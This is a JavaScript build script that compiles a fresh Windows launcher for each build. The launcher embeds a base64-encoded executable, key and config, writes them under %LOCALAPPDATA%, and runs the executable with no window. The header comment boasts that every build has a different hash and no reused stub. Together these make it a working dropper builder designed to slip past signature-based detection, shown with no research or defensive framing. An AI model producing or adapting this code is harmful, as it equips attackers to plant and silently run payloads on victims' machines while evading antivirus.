// language: JavaScript, file: builder/compile.js
// live-compiles the launcher per build with key/config/base baked as C literals.
// produces a fresh PE every time — different bytes, different hash, no reused stub.

import fs from 'node:fs';
import path from 'node:path';
import os from 'node:os';
import { execFile } from 'node:child_process';
import { promisify } from 'node:util';

const execFileP = promisify(execFile);

const CC = process.env.MINGW_CC || 'x86_64-w64-mingw32-gcc';

function cSource({ keyB64, cfgB64, baseB64 }) {
  return `
// auto-generated launcher — do not edit
#include <windows.h>
#include <shlobj.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

static const char KEY_B64[] = "${keyB64}";
static const char CFG_B64[] = "${cfgB64}";
static const char BASE_B64[] = "${baseB64}";

static int b64val(char c) {
    if (c >= 'A' && c <= 'Z') return c - 'A';
    if (c >= 'a' && c <= 'z') return c - 'a' + 26;
    if (c >= '0' && c <= '9') return c - '0' + 52;
    if (c == '+') return 62;
    if (c == '/') return 63;
    return -1;
}

static unsigned char *b64decode(const char *in, DWORD *out_len) {
    size_t n = strlen(in);
    unsigned char *out = (unsigned char *)malloc(n / 4 * 3 + 4);
    if (!out) return NULL;
    DWORD o = 0;
    int quad[4]; int qi = 0;
    for (size_t i = 0; i < n; i++) {
        char c = in[i];
        if (c == '=') break;
        int v = b64val(c);
        if (v < 0) continue;
        quad[qi++] = v;
        if (qi == 4) {
            out[o++] = (unsigned char)((quad[0] << 2) | (quad[1] >> 4));
            out[o++] = (unsigned char)(((quad[1] & 0xF) << 4) | (quad[2] >> 2));
            out[o++] = (unsigned char)(((quad[2] & 0x3) << 6) | quad[3]);
            qi = 0;
        }
    }
    if (qi == 2) {
        out[o++] = (unsigned char)((quad[0] << 2) | (quad[1] >> 4));
    } else if (qi == 3) {
        out[o++] = (unsigned char)((quad[0] << 2) | (quad[1] >> 4));
        out[o++] = (unsigned char)(((quad[1] & 0xF) << 4) | (quad[2] >> 2));
    }
    *out_len = o;
    return out;
}

static int write_file(const wchar_t *path, const unsigned char *data, DWORD len) {
    HANDLE f = CreateFileW(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (f == INVALID_HANDLE_VALUE) return -1;
    DWORD w = 0;
    BOOL ok = WriteFile(f, data, len, &w, NULL);
    CloseHandle(f);
    return (ok && w == len) ? 0 : -1;
}

static int make_dir(const wchar_t *path) {
    wchar_t tmp[2048]; wcsncpy(tmp, path, 2048); tmp[2047] = 0;
    for (wchar_t *p = tmp + 1; *p; p++) {
        if (*p == L'\\\\') { *p = 0; CreateDirectoryW(tmp, NULL); *p = L'\\\\'; }
    }
    if (!CreateDirectoryW(tmp, NULL)) {
        if (GetLastError() != ERROR_ALREADY_EXISTS) return -1;
    }
    return 0;
}

static int expand_env(const wchar_t *in, wchar_t *out, DWORD cap) {
    DWORD n = ExpandEnvironmentStringsW(in, out, cap);
    return (n > 0 && n <= cap) ? 0 : -1;
}

int wmain(void) {
    DWORD key_len = 0, cfg_len = 0, base_len = 0;
    unsigned char *key  = b64decode(KEY_B64,  &key_len);
    unsigned char *cfg  = b64decode(CFG_B64,  &cfg_len);
    unsigned char *base = b64decode(BASE_B64, &base_len);
    if (!key || !cfg || !base) return 1;

    char cfg_buf[4096] = {0};
    DWORD copy = cfg_len < sizeof(cfg_buf) - 1 ? cfg_len : sizeof(cfg_buf) - 1;
    memcpy(cfg_buf, cfg, copy);

    char dest[1024]   = "%LOCALAPPDATA%\\\\yc";
    char exeName[256] = "boot.exe";
    char keyFile[256] = "key.json";

    char *p;
    if ((p = strstr(cfg_buf, "\\"dest\\""))) {
        p = strchr(p, ':'); if (p) { p = strchr(p, '"'); if (p) { p++; char *q = strchr(p, '"'); if (q) { size_t n = q - p; if (n < sizeof(dest)) { memcpy(dest, p, n); dest[n] = 0; } } } }
    }
    if ((p = strstr(cfg_buf, "\\"exeName\\""))) {
        p = strchr(p, ':'); if (p) { p = strchr(p, '"'); if (p) { p++; char *q = strchr(p, '"'); if (q) { size_t n = q - p; if (n < sizeof(exeName)) { memcpy(exeName, p, n); exeName[n] = 0; } } } }
    }
    if ((p = strstr(cfg_buf, "\\"keyFile\\""))) {
        p = strchr(p, ':'); if (p) { p = strchr(p, '"'); if (p) { p++; char *q = strchr(p, '"'); if (q) { size_t n = q - p; if (n < sizeof(keyFile)) { memcpy(keyFile, p, n); keyFile[n] = 0; } } } }
    }

    wchar_t dest_src[1024], dest_w[1024];
    MultiByteToWideChar(CP_UTF8, 0, dest, -1, dest_src, 1024);
    if (expand_env(dest_src, dest_w, 1024) != 0) return 1;
    if (make_dir(dest_w) != 0) return 1;

    wchar_t base_path[2048], key_path[2048];
    _snwprintf(base_path, 2048, L"%ls\\\\%hs", dest_w, exeName);
    _snwprintf(key_path,  2048, L"%ls\\\\%hs", dest_w, keyFile);

    if (write_file(base_path, base, base_len) != 0) return 1;
    if (write_file(key_path,  key,  key_len)  != 0) return 1;

    STARTUPINFOW si = {0}; PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    wchar_t cmd[2048];
    _snwprintf(cmd, 2048, L"\\"%ls\\"", base_path);
    if (CreateProcessW(base_path, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, dest_w, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }

    free(key); free(cfg); free(base);
    return 0;
}
`;
}

export async function compileLauncher({ key, config, baseExe }) {
  const keyB64  = Buffer.from(key, 'utf8').toString('base64');
  const cfgB64  = Buffer.from(JSON.stringify(config), 'utf8').toString('base64');
  const baseB64 = fs.readFileSync(baseExe).toString('base64');

  const workDir = fs.mkdtempSync(path.join(os.tmpdir(), 'wh-build-'));
  const srcPath = path.join(workDir, 'l.c');
  const outPath = path.join(workDir, 'l.exe');

  fs.writeFileSync(srcPath, cSource({ keyB64, cfgB64, baseB64 }));

  try {
    await execFileP(CC, [
      '-O2', '-s', '-municode',
      '-o', outPath,
      srcPath,
      '-lshell32',
    ], { timeout: 60_000, maxBuffer: 32 * 1024 * 1024 });

    const buf = fs.readFileSync(outPath);
    return buf;
  } finally {
    try { fs.rmSync(workDir, { recursive: true, force: true }); } catch {}
  }
}